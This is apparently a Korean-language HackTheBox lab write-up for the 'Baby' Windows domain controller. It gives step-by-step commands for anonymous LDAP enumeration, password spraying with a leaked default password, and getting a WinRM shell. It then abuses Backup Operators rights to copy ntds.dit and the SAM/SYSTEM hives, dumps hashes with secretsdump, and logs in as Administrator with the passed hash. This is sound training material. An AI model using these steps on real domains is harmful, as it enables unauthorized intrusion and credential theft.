# Baby
- [Port Scanning](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/HackTheBox/Baby.md#port-scanning)
- [SMB](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/HackTheBox/Baby.md#smb)
- [LDAP](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/HackTheBox/Baby.md#ldap)
- [Login as Caroline.Robinson](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/HackTheBox/Baby.md#login-as-carolinerobinson)
- [Privesc](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/HackTheBox/Baby.md#privesc)


## Port Scanning
<img width="1204" height="513" alt="image" src="https://github.com/user-attachments/assets/02ad82d8-5600-4b5c-acc1-67f2f59d8b1e" />
<img width="1204" height="72" alt="image" src="https://github.com/user-attachments/assets/3fc4e595-1005-4b62-9246-0f0f2321bff7" />

- DNS
- KERBEROS
- LDAP
- SMB
- WINRM

## SMB
- `smbmap` guest 로그인 실패.
- `rpcclient` NULL 세션 로그인 실패.

## LDAP
- `ldapsearch`를 사용하여 모든 오브젝트 내용 수집.
```bash
ldapsearch -v -x -b 'dc=baby,dc=vl' -H 'ldap://10.129.234.71' '(objectclass=*)' > ldap
```
<img width="1204" height="130" alt="image" src="https://github.com/user-attachments/assets/07e7fdc5-ee9e-4f87-be84-39be9b72ef03" />

## Login as Caroline.Robinson
- `/etc/hosts`에 도메인 등록.
<img width="1204" height="77" alt="image" src="https://github.com/user-attachments/assets/e8d76eb7-1b60-46ca-b779-9de638b1bc8a" />

<br>
<br>

- `Teresa Bell`유저의 `description`에서 초기 비밀번호가 `BabyStart123!`으로 설정되어 있다는 것을 확인.
<img width="1204" height="221" alt="image" src="https://github.com/user-attachments/assets/77c0c3f9-ef71-4044-b7ad-eb9b2bf5cce7" />

<br>
<br>

- `userPrincipalName` 오브젝트로부터 계정명 추출.
```bash
cat ldap|grep -i userPrincipalName
```
<img width="1204" height="251" alt="image" src="https://github.com/user-attachments/assets/548afdc3-40d5-4268-bc61-5124a7c17478" />

<br>
<br>

- 추출된 계정들을 저장.
<img width="1204" height="251" alt="image" src="https://github.com/user-attachments/assets/ddba482c-34c9-45db-863d-b7278905cadb" />

<br>
<br>

- 로그인 시도하였으나 실패.
```bash
nxc smb 10.129.172.77 -u users -p 'BabyStart123!' --continue-on-success
```
<img width="1204" height="298" alt="image" src="https://github.com/user-attachments/assets/906afe6e-b7ea-4b16-a958-e783ea50472a" />

<br>
<br>

- 수집된 파일을 조금 더 살펴보니 `dn(Domain Name)`만 수집된 `Caroline Robinson`를 발견.
<img width="1204" height="58" alt="image" src="https://github.com/user-attachments/assets/fd878235-7d8e-4e4b-ba8e-648e08ede5e8" />

<br>
<br>

- 다른 계정명들의 패턴과 같이 `Caroline.Robinson`로 수정하여 로그인 시도.
- `STATUS_PASSWORD_MUST_CHANGE` 오류 발생.
```bash
nxc smb 10.129.172.77 -u Caroline.Robinson -p 'BabyStart123!'
```
<img width="1204" height="152" alt="image" src="https://github.com/user-attachments/assets/b3d86003-91fc-403e-b0ad-5fc7ec7e5edf" />

<br>
<br>

- `nxc`의 `change-password` 모듈을 사용하여 비밀번호 변경.
```bash
nxc smb 10.129.172.77 -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS='Summer2026!'
```
<img width="1204" height="176" alt="image" src="https://github.com/user-attachments/assets/fc31dd4f-a244-4755-92a2-83a69655d841" />

<br>
<br>

- `WINRM` 로그인 성공.
```bash
nxc winrm 10.129.172.77 -u Caroline.Robinson -p 'Summer2026!'
```
<img width="1204" height="201" alt="image" src="https://github.com/user-attachments/assets/1dbbedcc-1bf7-43f4-a1eb-a6adf09732ed" />

<br>
<br>

- `Caroline.Robinson` 셸 획득.
```bash
evil-winrm -i 10.129.172.77 -u Caroline.Robinson -p 'Summer2026!'
```
<img width="1204" height="317" alt="image" src="https://github.com/user-attachments/assets/7cf151d4-89bc-47bb-9a04-caee06c869f6" />

## Privesc
- `Backup Operators` 그룹에 속해 있음.
- `NTDS.dit`에 접근이 가능해져 도메인 계정의 패스워드 추출이 가능.
```powershell
whoami /all
```
<img width="1204" height="486" alt="image" src="https://github.com/user-attachments/assets/006bb4d8-ab80-4935-82f1-a12ed7a474c2" />

<br>
<br>

- `vss.dsh` 생성.
- `NTDS.DIT`는 관리자 권한이 있어도 레지스트리 덤프처럼 직접 저장이 불가능해 `diskshadow`를 사용하여 VSS 스냅샷을 생성 후 드라이브로 마운트를 하여 복사를 시도.
<img width="1204" height="155" alt="image" src="https://github.com/user-attachments/assets/e9db3b41-013d-4374-ac10-c79797c2d59f" />

<br>
<br>

- `unix2dos`로 줄바꿈 변경.
<img width="1204" height="80" alt="image" src="https://github.com/user-attachments/assets/05535da4-06fe-4446-b3c6-d092eb813975" />

<br>
<br>

- 서버에 `vss.dsh`를 업로드.
```powershell
upload vss.dsh
```
<img width="1204" height="172" alt="image" src="https://github.com/user-attachments/assets/ab50a974-1635-45b3-92fc-0ebd4e8f17b3" />

<br>
<br>

- C드라이브 스냅샷을 생성해 X드라이브로 마운트.
```powershell
diskshadow /s vss.dsh
```
<img width="1204" height="582" alt="image" src="https://github.com/user-attachments/assets/f1faac78-0dbb-470c-b7c7-b81a7ce3a8b4" />

<br>
<br>

- `ntds.dit`를 복사.
```powershell
robocopy /b x:\windows\ntds . ntds.dit
```
<img width="1204" height="340" alt="image" src="https://github.com/user-attachments/assets/2b702fbf-bf00-4269-8f69-e2b9f5151290" />

<br>
<br>

- `SAM`과 `SYSTEM` 레지스트리 덤프.
```powershell
reg save hklm\sam sam

reg save hklm\system system
```
<img width="1204" height="130" alt="image" src="https://github.com/user-attachments/assets/c73a40a5-fb4c-4dbe-ba0e-eadb55b2f29f" />

<br>
<br>

- 로컬로 다운로드 후 `secretsdump`로 해시 추출.
- `Administrator` 해시 획득.
```powershell
donwload ntds.dit
download sam
download system
```
```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```
<img width="1204" height="566" alt="image" src="https://github.com/user-attachments/assets/4bac66d6-00f0-4cc2-8509-ed052872cddd" />

<br>
<br>

- `WINRM` 로그인 시도하여 성공.
```bash
nxc winrm 10.129.172.77 -u administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```
<img width="1204" height="209" alt="image" src="https://github.com/user-attachments/assets/b2c75e52-c61a-4a5b-9b57-d280a0adad3e" />

<br>
<br>

- `Administrator` 셸 획득.
<img width="1204" height="322" alt="image" src="https://github.com/user-attachments/assets/5c2dae8e-c104-4527-a1b5-dba9193f3dfb" />

